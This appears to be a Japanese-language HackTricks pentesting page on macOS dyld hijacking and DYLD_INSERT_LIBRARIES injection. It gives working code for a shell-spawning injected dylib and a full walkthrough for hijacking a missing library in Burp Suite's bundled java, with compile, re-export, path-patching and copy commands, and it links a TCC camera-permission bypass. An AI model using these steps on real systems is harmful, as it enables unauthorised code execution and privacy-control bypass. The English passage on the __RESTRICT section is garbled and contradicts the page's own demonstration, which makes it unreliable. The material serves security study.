# macOS Dyldハイジャッキング＆DYLD_INSERT_LIBRARIES

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## DYLD\_INSERT\_LIBRARIESの基本的な例

**シェルを実行するために注入するライブラリ**：
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
}
```
攻撃対象のバイナリ：
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
インジェクション:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Dyldハイジャックの例

対象の脆弱なバイナリは`/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`です。

{% tabs %}
{% tab title="LC_RPATH" %}
{% code overflow="wrap" %}
```bash
# Check where are the @rpath locations
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib (offset 12)
```
{% endcode %}
{% endtab %}

{% tab title="@rpath" %}
{% code overflow="wrap" %}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep "@rpath" -A 3
name @rpath/libjli.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
```
{% endcode %}
{% endtab %}

{% tab title="entitlements" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>
{% endtab %}
{% endtabs %}

前の情報から、**ロードされたライブラリの署名をチェックしていない**ことがわかり、次の場所からライブラリをロードしようとしていることがわかりました：

* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`

しかし、最初のライブラリは存在しません：
```bash
pwd
/Applications/Burp Suite Professional.app

find ./ -name libjli.dylib
./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
```
そうです、それをハイジャックすることが可能です！合法的なライブラリと同じ機能をエクスポートする任意のコードを実行するライブラリを作成し、それを再エクスポートするようにしてください。そして、期待されるバージョンでコンパイルすることを忘れないでください：

{% code title="libjli.m" %}
```objectivec
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s",argv[0]);
}
```
{% endcode %}

コンパイルします：

{% code overflow="wrap" %}
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation libjli.m -Wl,-reexport_library,"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o libjli.dylib
# Note the versions and the reexport
```
{% endcode %}

ライブラリで作成された再エクスポートパスは、ローダーに対して相対パスです。エクスポートするライブラリの絶対パスに変更しましょう。

{% code overflow="wrap" %}
```bash
#Check relative
otool -l libjli.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change to absolute to the location of the library
install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" libjli.dylib

# Check again
otool -l libjli.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
{% endcode %}

最後に、それを**ハイジャックされた場所**にコピーします：

{% code overflow="wrap" %}
```bash
cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
```
{% endcode %}

そして、バイナリを**実行**し、**ライブラリがロードされたか**を確認します：

<pre class="language-context"><code class="lang-context">./java
<strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] ./java で dylib がハイジャックされました
</strong>Usage: java [options] &#x3C;mainclass> [args...]
(to execute a class)
</code></pre>

{% hint style="info" %}
Telegram のカメラの許可を乱用するためにこの脆弱性を乱用する方法についての素晴らしい解説は、[https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) で見つけることができます。
{% endhint %}

## より大規模なスケール

予期しないバイナリにライブラリを注入しようとする場合、イベントメッセージをチェックしてプロセス内でライブラリがロードされたタイミングを確認することができます（この場合、printfと`/bin/bash`の実行を削除します）。
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## 制限の確認

### SUIDとSGID
```bash
# Make it owned by root and suid
sudo chown root hello
sudo chmod +s hello
# Insert the library
DYLD_INSERT_LIBRARIES=inject.dylib ./hello

# Remove suid
sudo chmod -s hello
```
### セクション `__RESTRICT` とセグメント `__restrict`

The `__RESTRICT` section and `__restrict` segment are used in macOS to restrict the loading of dynamic libraries. When a binary is compiled with the `-segprot` flag, the `__restrict` segment is created to specify the protection settings for the `__RESTRICT` section.

The `__RESTRICT` section contains a list of dynamic libraries that are restricted from being loaded by the dynamic linker (`dyld`). This restriction is enforced by the `__restrict` segment, which specifies the protection settings for the `__RESTRICT` section.

By manipulating the `__RESTRICT` section and the `__restrict` segment, an attacker can hijack the dynamic library loading process and execute malicious code. This technique is known as dyld hijacking.

To perform dyld hijacking, an attacker needs to find a vulnerable binary that loads dynamic libraries and has the `__RESTRICT` section. The attacker then creates a malicious dynamic library with the same name as one of the libraries listed in the `__RESTRICT` section. When the vulnerable binary is executed, the attacker's malicious library is loaded instead of the legitimate one, allowing the attacker to execute arbitrary code with the privileges of the vulnerable binary.

To prevent dyld hijacking, it is important to ensure that binaries are compiled with proper protection settings and that the `__RESTRICT` section is properly configured. Additionally, regular security updates should be applied to mitigate any known vulnerabilities that could be exploited for dyld hijacking.
```bash
gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
```
### ハードニングされたランタイム

キーチェーンに新しい証明書を作成し、それを使用してバイナリに署名します：

{% code overflow="wrap" %}
```bash
codesign -s <cert-name> --option=runtime ./hello
DYLD_INSERT_LIBRARIES=inject.dylib ./hello

codesign -f -s <cert-name> --option=library ./hello
DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Will throw an error because signature of binary and library aren't signed by same cert

codesign -s <cert-name> inject.dylib
DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Throw an error because an Apple dev certificate is needed
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
